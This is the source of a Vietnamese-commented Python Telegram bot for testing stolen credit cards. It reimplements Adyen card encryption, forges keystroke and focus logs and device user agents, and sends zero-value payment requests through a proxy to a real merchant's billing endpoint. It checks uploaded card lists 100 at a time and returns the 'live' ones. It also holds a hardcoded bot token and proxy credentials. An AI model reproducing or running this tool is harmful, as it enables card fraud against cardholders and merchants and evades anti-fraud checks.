import os
import json
import hmac
import hashlib
import base64
import re
import string
import random
import sys
import time
import asyncio
import io
import psutil  # Thư viện mới để check CPU/RAM
from datetime import datetime

# Thư viện Telegram Bot (aiogram 3.x)
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.types import BufferedInputFile

# Thư viện mã hóa
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP, AES
from Cryptodome.Util.Padding import pad
from jose import jwk

# Thư viện request bất đồng bộ (Async)
import aiohttp

# ==========================================
# CẤU HÌNH BOT
# ==========================================
TOKEN = "8110946929:AAGFn8gap9gMHH4_pABitcNd-saTGl24g0I"  # <--- Dán Token BotFather vào đây
ALLOWED_USER_ID = 7787551672  # Nếu muốn giới hạn người dùng, điền ID vào đây

# Khởi tạo Bot
bot = Bot(token=TOKEN)
dp = Dispatcher()

# ===================================================================
# === PHẦN 1: CÁC HÀM VALIDATION THẺ (CORE CŨ)
# ===================================================================

def normalize_card(card_str):
    """Chuẩn hóa chuỗi thẻ về định dạng cc|mm|yyyy|cvv."""
    pattern = r'(\d{13,19})[|/:](\d{1,2})[|/:](\d{2,4})[|/:](\d{3,4})'
    match = re.search(pattern, card_str)
    if not match:
        return None
    card_num, month, year, cvv = match.groups()
    
    month_int = int(month)
    if month_int < 1 or month_int > 12:
        return None
    month = month.zfill(2)
    
    if len(year) == 2:
        year = '20' + year
    year_int = int(year)
    if year_int < 2000 or year_int > 2099:
        return None
        
    return f"{card_num}|{month}|{year}|{cvv}"

def validate_luhn(card_number):
    """Kiểm tra thuật toán Luhn."""
    card_num = ''.join(filter(str.isdigit, str(card_number)))
    if not card_num or len(card_num) < 13 or len(card_num) > 19:
        return False
    total = 0
    reverse_digits = card_num[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n = n * 2
            if n > 9:
                n = n - 9
        total += n
    return total % 10 == 0

def get_short_brand_name(cc):
    first_digit = cc[0]
    if first_digit in ['5', '2']: return 'mc'
    elif first_digit == '4': return 'visa'
    elif cc.startswith('34') or cc.startswith('37'): return 'amex'
    elif cc.startswith('60') or cc.startswith('64') or cc.startswith('65'): return 'discover'
    elif cc.startswith('62'): return 'cup'
    elif cc.startswith('35'): return 'jcb'
    elif cc.startswith('30') or cc.startswith('36') or cc.startswith('38'): return 'diners'
    elif cc.startswith('67'): return 'maestro'
    else: return 'unknown'

# ===================================================================
# === PHẦN 2: LOGIC MÃ HÓA ADYEN (GIỮ NGUYÊN)
# ===================================================================

def get_current_timestamp():
    return datetime.utcnow().isoformat() + 'Z'

def generate_fake_log(input_len):
    log_entries = []
    current_time = random.randint(2000, 5000)
    log_entries.append(f"fo@{current_time}")
    current_time += random.randint(50, 200)
    log_entries.append(f"cl@{current_time}")
    current_time += random.randint(100, 300)
    for _ in range(input_len):
        log_entries.append(f"KN@{current_time}")
        current_time += random.randint(60, 180)
    return ",".join(log_entries)

def w(e):
    t = e
    if isinstance(t, str):
        t = t.encode('utf-8')
    return base64.b64encode(t).decode('utf-8')

def _(e):
    return w(e).replace('=', '').replace('+', '-').replace('/', '_')

def k(e):
    if not e: return bytearray(0)
    if len(e) % 2 == 1: e = "0" + e
    t = len(e) // 2
    r = bytearray(t)
    for n in range(t):
        r[n] = int(e[n*2:n*2+2], 16)
    return r

bt = 2**32
def mt(e, t, r):
    if not (0 <= t < bt):
        raise ValueError(f"value must be >= 0 and <= {bt - 1}. Received {t}")
    e[r:r+4] = [(t >> 24) & 0xff, (t >> 16) & 0xff, (t >> 8) & 0xff, t & 0xff]

class AdyenV4_8_0:
    def __init__(self, site_key):
        self.site_key = site_key
        self.key_object = None

    def generate_key(self):
        parts = self.site_key.split("|")
        part1, part2 = parts[0], parts[1]
        decoded_part1, decoded_part2 = k(part1), k(part2)
        encoded_part1, encoded_part2 = _(decoded_part1), _(decoded_part2)

        self.key_object = {
            "kty": "RSA", "kid": "asf-key", "e": encoded_part1, "n": encoded_part2, "alg": "RSA-OAEP",
        }
        return self.key_object

    def encrypt_data(self, plain_text):
        public_key = jwk.construct(self.key_object)
        pem = public_key.to_pem().decode('utf-8')
        rsa_key = RSA.import_key(pem)
        random_bytes = os.urandom(64)
        cipher_rsa = PKCS1_OAEP.new(rsa_key)
        encrypted_key = cipher_rsa.encrypt(random_bytes)
        cek = random_bytes
        protected_header = {"alg":"RSA-OAEP","enc":"A256CBC-HS512","version":"1"}
        protected_header_b64 = _(json.dumps(protected_header).encode('utf-8'))
        _iv = os.urandom(16)
        _plaintext = json.dumps(plain_text).encode('utf-8')
        aes_key = cek[32:]
        hmac_key = cek[:32]
        cipher_aes = AES.new(aes_key, AES.MODE_CBC, _iv)
        padded_plaintext = pad(_plaintext, AES.block_size)
        ciphertext = cipher_aes.encrypt(padded_plaintext)
        protected_header2_bytes = protected_header_b64.encode('utf-8')
        f = len(protected_header2_bytes) * 8
        d, h_val = f // bt, f % bt
        y = bytearray(8)
        mt(y, d, 0)
        mt(y, h_val, 4)
        hmac_obj = hmac.new(hmac_key, digestmod=hashlib.sha512)
        hmac_obj.update(protected_header2_bytes + _iv + ciphertext + y)
        tag = hmac_obj.digest()[:32]
        return f"{protected_header_b64}.{_(encrypted_key)}.{_(_iv)}.{_(ciphertext)}.{_(tag)}"

def format_card_number(card):
    return ' '.join(card[i:i+4] for i in range(0, len(card), 4))

def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, domain=None):
    if not stripe_key: stripe_key = "live_2WKDYLJCMBFC5CFHBXY2CHZF4MUUJ7QU"
    if not domain: domain = "https://www.mytheresa.com"
    domain_b64 = base64.b64encode(domain.encode('utf-8')).decode('utf-8')
    referrer = f"https://checkoutshopper-live.adyen.com/checkoutshopper/securedfields/{stripe_key}/5.5.0/securedFields.html?type=card&d={domain_b64}"
    card_number = format_card_number(card)
    card_detail = {
        "encryptedCardNumber": {"number": card_number, "generationtime": get_current_timestamp(), "numberBind": "1", "activate": "3", "referrer": referrer, "numberFieldFocusCount": "1", "numberFieldLog": generate_fake_log(16), "numberFieldClickCount": "1", "numberFieldKeyCount": "16"},
        "encryptedExpiryMonth": {"expiryMonth": month, "generationtime": get_current_timestamp()},
        "encryptedExpiryYear": {"expiryYear": year, "generationtime": get_current_timestamp()},
        "encryptedSecurityCode": {"cvc": cvc, "generationtime": get_current_timestamp(), "cvcBind": "1", "activate": "4", "referrer": referrer, "cvcFieldFocusCount": "1", "cvcFieldLog": generate_fake_log(3), "cvcFieldClickCount": "1", "cvcFieldKeyCount": "3", "cvcFieldChangeCount": "1", "cvcFieldBlurCount": "1", "deactivate": "2"}
    }
    adyen_encryptor = AdyenV4_8_0(adyen_key)
    adyen_encryptor.generate_key()
    encrypted_details = {}
    for key, value in card_detail.items():
        encrypted_details[key] = adyen_encryptor.encrypt_data(value)
    return encrypted_details

# ===================================================================
# === PHẦN 3: GENERATE OKHTTP PROFILE
# ===================================================================

def generate_random_model_string():
    def random_digits(n): return ''.join(random.choices(string.digits, k=n))
    def random_chars(n): return ''.join(random.choices(string.ascii_uppercase, k=n))
    patterns = [
        lambda: f"SM-G9{random.choice(['9', '8'])}{random.choice(['1', '0'])}{random.choice(['B', 'F'])}",
        lambda: f"SM-A{random.randint(10, 73)}{random.randint(5, 7)}{random.choice(['F', 'M'])}",
        lambda: f"CPH{random.randint(1900, 2600)}",
        lambda: f"Pixel {random.randint(4, 9)}",
        lambda: f"RMX{random.randint(1800, 3900)}"
    ]
    return random.choice(patterns)()

def generate_okhttp_profile():
    okhttp_ids = ["okhttp4_android_4", "okhttp4_android_5", "okhttp4_android_6"]
    selected_id = random.choice(okhttp_ids)
    android_ver = selected_id.split('_')[-1]
    model = generate_random_model_string()
    user_agent = f"Mozilla/5.0 (Linux; Android {android_ver}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,120)}.0.{random.randint(4000,6000)}.{random.randint(50,200)} Mobile Safari/537.36"
    return {"client_identifier": selected_id, "user_agent": user_agent}

# ===================================================================
# === PHẦN 4: LOGIC CHECK CARD (CORE)
# ===================================================================

async def check_single_card(sem, session, card_line):
    """
    Hàm xử lý check 1 thẻ. 
    Lưu ý: sem có thể là None nếu chạy lệnh đơn lẻ.
    """
    async_context = sem if sem else asyncio.Semaphore(1)
    
    async with async_context:
        try:
            normalized = normalize_card(card_line)
            if not normalized: return {"status": "INVALID_FMT", "msg": "Sai định dạng", "raw": card_line}
            cc, mm, yyyy, cvc = normalized.split('|')

            if not validate_luhn(cc): return {"status": "LUHN_FAIL", "msg": "Luhn sai", "raw": card_line}

            ADYEN_PUB_KEY = "10001|C740E51C2E7CEDAFC96AA470E575907B40E84E861C8AB2F4952423F704ABC29255A37C24DED6068F7D1E394100DAD0636A8362FC1A5AAE658BB9DA4262676D3BFFE126D0DF11C874DB9C361A286005280AD45C06876395FB60977C25BED6969A3A586CD95A3BE5BE2016A56A5FEA4287C9B4CAB685A243CFA04DC5C115E11C2473B5EDC595D3B97653C0EA42CB949ECDEA6BC60DC9EDF89154811B5E5EBF57FDC86B7949BA300F679716F67378361FF88E33E012F31DB8A14B00C3A3C2698D2CA6D3ECD9AE16056EE8E13DFFE2C99E1135BBFCE4718822AB8EA74BEBA4B1B99BBE43F2A6CC70882B6E5E1A917F8264180BE6CD7956967B9D8429BF9C0808004F"
            STRIPE_KEY = "live_CFDMTKEQ6RE5FPLXYTYYUGWJBUCBUWI7"
            TARGET_DOMAIN = "https://www.activecampaign.com"
            
            # Proxy Configuration
            proxy_url = "http://88634867-zone-custom:AetOKcLB@aus.360s5.com:3600"

            max_retries = 20
            
            for attempt in range(max_retries):
                try:
                    encrypted_result = encrypt_card_data_480(cc, mm, yyyy, cvc, ADYEN_PUB_KEY, STRIPE_KEY, TARGET_DOMAIN)
                    profile = generate_okhttp_profile()
                    email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'
                    name = ''.join(random.choices(string.ascii_letters + ' ', k=10))
                    
                    headers = {
                        'accept': 'application/json, text/plain, */*',
                        'accept-language': 'vi-VN,vi;q=0.9',
                        'content-type': 'application/json',
                        'user-agent': profile['user_agent'],
                        'origin': 'https://www.activecampaign.com',
                        'referer': 'https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
                    }
                    
                    json_data = {
                        'paymentMethod': {
                            'type': 'scheme', 'holderName': name,
                            'encryptedCardNumber': encrypted_result['encryptedCardNumber'],
                            'encryptedExpiryMonth': encrypted_result['encryptedExpiryMonth'],
                            'encryptedExpiryYear': encrypted_result['encryptedExpiryYear'],
                            'encryptedSecurityCode': encrypted_result['encryptedSecurityCode'],
                            'brand': get_short_brand_name(cc),
                            'checkoutAttemptId': '13cb7ddc-d547-4243-9ae7-db383f27b7e31768731017809D9F2B239CAAA395BD17EB4E018DECAB476BC83B3833879AB0F584D9F1EC894A0',
                        },
                        'shopperEmail': email, 'shopperName': name,
                        'billingAddress': {'city': 'NewYork', 'country': 'US', 'postalCode': '10001', 'stateOrProvince': 'NY', 'street': ''},
                        'telephoneNumber': '1234567890',
                        'amount': {'value': 0, 'currency': 'USD'},
                        'returnUrl': 'https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
                    }

                    async with session.post('https://www.activecampaign.com/api/billing/adyen/payments', headers=headers, json=json_data, proxy=proxy_url, timeout=30) as response:
                        text = await response.text()
                        try:
                            data = json.loads(text)
                        except:
                            if attempt < max_retries - 1: continue
                            return {"status": "ERROR", "msg": "Json Error", "raw": normalized}

                        add_data = data.get('additionalData', {})
                        res_code = data.get('resultCode', add_data.get('resultCode', 'N/A'))
                        refusal = data.get('refusalReason', add_data.get('refusalReason', 'N/A'))
                        
                        # Logic kết quả
                        if res_code == 'N/A' and 'message' not in data and attempt < max_retries - 1:
                            continue

                        output_str = f"{cc}|{mm}|{yyyy}|{cvc} - {res_code} - {refusal}"
                        
                        if res_code == "Authorised" or res_code == "Cancelled":
                            return {"status": "LIVE", "msg": output_str, "raw": normalized}
                        elif res_code == "Refused":
                            return {"status": "DIE", "msg": output_str, "raw": normalized}
                        elif res_code in ["IdentifyShopper", "ChallengeShopper", "RedirectShopper"]:
                            return {"status": "3DS", "msg": output_str, "raw": normalized}
                        else:
                            return {"status": "UNK", "msg": output_str, "raw": normalized}

                except Exception:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(1)
                        continue
                    else:
                        return {"status": "ERROR", "msg": "Exception", "raw": normalized}

            return {"status": "ERROR", "msg": "Retry Exhausted", "raw": normalized}

        except Exception as e:
            return {"status": "CRASH", "msg": str(e), "raw": card_line}

# ===================================================================
# === PHẦN 5: BOT HANDLERS & REAL-TIME LOGIC
# ===================================================================

@dp.message(Command("start"))
async def start_handler(message: types.Message):
    await message.reply(
        "👋 Chào bạn!\n\n"
        "1. Gửi file `.txt` (cc|mm|yy|cvv) để check hàng loạt.\n"
        "2. Dùng lệnh `/st cc|mm|yy|cvv` để check 1 thẻ."
    )

# --- XỬ LÝ LỆNH CHECK 1 THẺ (/st) ---
@dp.message(Command("st"))
async def check_single_cmd_handler(message: types.Message):
    if ALLOWED_USER_ID and message.from_user.id != ALLOWED_USER_ID:
        return await message.reply("⛔ Bạn không có quyền sử dụng bot này.")

    args = message.text.split()
    if len(args) < 2:
        return await message.reply("⚠️ Vui lòng nhập thẻ. Ví dụ: `/st 400000|10|2025|111`", parse_mode="Markdown")

    card_input = args[1]
    msg = await message.reply(f"⏳ Đang kiểm tra thẻ: `{card_input}`...", parse_mode="Markdown")

    async with aiohttp.ClientSession() as session:
        result = await check_single_card(None, session, card_input)

    status_icon = "🔴"
    if result['status'] == 'LIVE': status_icon = "🟢"
    elif result['status'] == '3DS': status_icon = "🟡"
    
    await msg.edit_text(f"{status_icon} **{result['status']}**\n`{result['msg']}`", parse_mode="Markdown")

# --- HÀM CẬP NHẬT STATS REAL-TIME ---
class CheckStats:
    def __init__(self):
        self.total = 0
        self.checked = 0
        self.live = 0
        self.die = 0
        self.error = 0
        self.start_time = time.time()
        self.is_running = True

async def report_progress(message, stats: CheckStats):
    """Cập nhật tin nhắn thống kê mỗi 3 giây."""
    while stats.is_running:
        if stats.checked > 0:
            elapsed = time.time() - stats.start_time
            cpm = int((stats.checked / elapsed) * 60) if elapsed > 0 else 0
            
            # Lấy thông số hệ thống
            cpu_usage = psutil.cpu_percent()
            ram_usage = psutil.virtual_memory().percent

            text = (
                f"📊 **TRẠNG THÁI CHECK REAL-TIME**\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"💳 Tổng: `{stats.total}`\n"
                f"🔄 Đã check: `{stats.checked}`\n"
                f"🟢 Live: `{stats.live}`\n"
                f"🔴 Die: `{stats.die}`\n"
                f"⚪ Error/Unk: `{stats.error}`\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"⚡ CPM: `{cpm}`\n"
                f"🖥 CPU: `{cpu_usage}%` | 💾 RAM: `{ram_usage}%`"
            )
            
            try:
                await message.edit_text(text, parse_mode="Markdown")
            except Exception:
                pass # Bỏ qua nếu bị rate limit
        
        await asyncio.sleep(3) # Cập nhật mỗi 3s

# Wrapper worker để update stats
async def worker_with_stats(sem, session, card, stats, results_list):
    res = await check_single_card(sem, session, card)
    
    stats.checked += 1
    if res['status'] == 'LIVE':
        stats.live += 1
    elif res['status'] == 'DIE':
        stats.die += 1
    else:
        stats.error += 1
        
    results_list.append(res)

@dp.message(F.document)
async def handle_document(message: types.Message):
    if ALLOWED_USER_ID and message.from_user.id != ALLOWED_USER_ID:
        return await message.reply("⛔ Bạn không có quyền sử dụng bot này.")

    doc = message.document
    if not doc.file_name.endswith('.txt'):
        return await message.reply("⚠️ Chỉ nhận file .txt!")

    status_msg = await message.reply("⏳ Đang tải file...")

    # Tải file
    file_io = io.BytesIO()
    bot_file = await bot.get_file(doc.file_id)
    await bot.download_file(bot_file.file_path, file_io)
    file_io.seek(0)
    
    content = file_io.read().decode('utf-8', errors='ignore')
    cards = [line.strip() for line in content.splitlines() if line.strip()]
    
    if not cards:
        return await status_msg.edit_text("⚠️ File rỗng!")

    # Khởi tạo Stats
    stats = CheckStats()
    stats.total = len(cards)

    # Chạy Background Task update tin nhắn
    monitor_task = asyncio.create_task(report_progress(status_msg, stats))

    # Cấu hình worker
    sem = asyncio.Semaphore(100) # 100 luồng
    tasks = []
    results = [] # Danh sách chứa kết quả để tạo file cuối cùng
    
    async with aiohttp.ClientSession() as session:
        for card in cards:
            tasks.append(asyncio.create_task(worker_with_stats(sem, session, card, stats, results)))
        
        await asyncio.gather(*tasks)

    # Dừng monitor
    stats.is_running = False
    await monitor_task # Đợi lần update cuối
    
    # Tổng hợp kết quả Live
    live_list = [res['msg'] for res in results if res['status'] == 'LIVE']

    # Tạo nội dung tổng kết cuối cùng
    final_summary = (
        f"✅ **HOÀN THÀNH**\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"💳 Tổng: `{stats.total}`\n"
        f"🟢 Live: `{stats.live}`\n"
        f"🔴 Die: `{stats.die}`\n"
        f"⚪ Error: `{stats.error}`\n"
        f"⏱ Thời gian: `{int(time.time() - stats.start_time)}s`"
    )

    if live_list:
        result_str = "\n".join(live_list)
        result_file = BufferedInputFile(result_str.encode('utf-8'), filename="live_cards.txt")
        # Gửi file mới, xóa tin nhắn báo cáo cũ hoặc edit nó
        await message.reply_document(result_file, caption=final_summary, parse_mode="Markdown")
    else:
        await message.reply(final_summary + "\n\n⚠️ Không tìm thấy thẻ Live nào.", parse_mode="Markdown")

# ===================================================================
# === MAIN EXECUTION
# ===================================================================

async def main():
    print("Bot started...")
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
